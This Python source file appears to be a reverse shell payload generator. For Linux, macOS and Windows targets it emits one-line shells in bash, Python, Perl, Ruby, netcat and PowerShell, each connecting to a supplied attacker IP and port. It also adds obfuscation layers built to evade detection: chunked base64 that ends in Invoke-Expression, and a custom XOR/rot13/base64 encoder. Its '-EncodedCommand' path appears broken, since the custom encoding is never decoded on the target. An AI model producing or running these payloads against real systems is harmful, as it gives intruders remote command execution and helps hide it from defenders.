import base64
import random
import string

def xor(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def rot13(s: str) -> str:
    return s.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))

def encode_polymorphic(data: str, key: str, rounds=2) -> str:
    encoded = data
    for _ in range(rounds):
        b64_1 = base64.b64encode(encoded.encode())
        r13 = rot13(b64_1.decode())
        xor_encoded = xor(r13.encode(), key.encode())
        encoded = base64.b64encode(xor_encoded).decode()
    return encoded

def decode_polymorphic(encoded: str, key: str, rounds=2) -> str:
    decoded = encoded
    for _ in range(rounds):
        b64_decoded = base64.b64decode(decoded)
        xor_decoded = xor(b64_decoded, key.encode())
        r13_decoded = rot13(xor_decoded.decode())
        decoded = base64.b64decode(r13_decoded).decode()
    return decoded

def obfuscate_powershell_advanced(code: str) -> str:
    chunks = [code[i:i+30] for i in range(0, len(code), 30)]
    vars = []
    parts = []
    for chunk in chunks:
        var = ''.join(random.choices(string.ascii_letters, k=6))
        vars.append(var)
        enc = base64.b64encode(chunk.encode()).decode()
        parts.append(f"${var} = '{enc}';")
    reconstruct = "$decoded = '';"
    for var in vars:
        reconstruct += f"$decoded += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${var}));"
    reconstruct += "Invoke-Expression $decoded;"
    return ''.join(parts) + reconstruct

def generate_payload(os_type, lang, ip, port, protocol="tcp", encode=False, obfuscate=False, key="key"):
    os_type = os_type.lower()
    lang = lang.lower()
    protocol = protocol.lower()

    if protocol not in ('tcp', 'udp'):
        raise ValueError("Protocol must be 'tcp' or 'udp'")

    payload = ""

    if os_type in ('linux', 'macos'):
        if lang == "bash":
            if protocol == "tcp":
                payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            else:
                raise NotImplementedError("UDP bash not supported")
        elif lang == "python":
            if protocol == "tcp":
                payload = (
                    f"python3 -c 'import socket,os,pty;"
                    f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    f"s.connect((\"{ip}\",{port}));"
                    f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                    f"pty.spawn(\"/bin/bash\")'"
                )
            else:
                raise NotImplementedError("UDP python not supported")
        elif lang == "perl":
            if protocol == "tcp":
                payload = (
                    f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                    f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                    f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
                )
            else:
                raise NotImplementedError("UDP perl not supported")
        elif lang == "ruby":
            if protocol == "tcp":
                payload = (
                    f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                    f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
                )
            else:
                raise NotImplementedError("UDP ruby not supported")
        elif lang == "nc":
            if protocol == "tcp":
                payload = f"nc -e /bin/bash {ip} {port}"
            else:
                raise NotImplementedError("UDP nc not supported")
        else:
            raise ValueError("Unsupported language for Linux/macOS")

    elif os_type == "windows":
        if lang == "powershell":
            raw = (
                f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                f"$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                f"$sendback = (iex $data 2>&1 | Out-String );"
                f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);"
                f"$stream.Flush()}};"
                f"$client.Close()"
            )
            if obfuscate:
                raw = obfuscate_powershell_advanced(raw)
            if encode:
                raw = encode_polymorphic(raw, key, rounds=3)
                raw_b64 = base64.b64encode(raw.encode()).decode()
                raw = f"powershell -EncodedCommand {raw_b64}"
            payload = raw
        elif lang == "python":
            if protocol == "tcp":
                payload = (
                    f"python -c \"import socket,subprocess,os;"
                    f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    f"s.connect(('{ip}',{port}));"
                    f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                    f"p=subprocess.call(['cmd.exe']);\""
                )
            else:
                raise NotImplementedError("UDP python not supported")
        else:
            raise ValueError("Unsupported language for Windows")

    else:
        raise ValueError("Unsupported OS")

    return payload
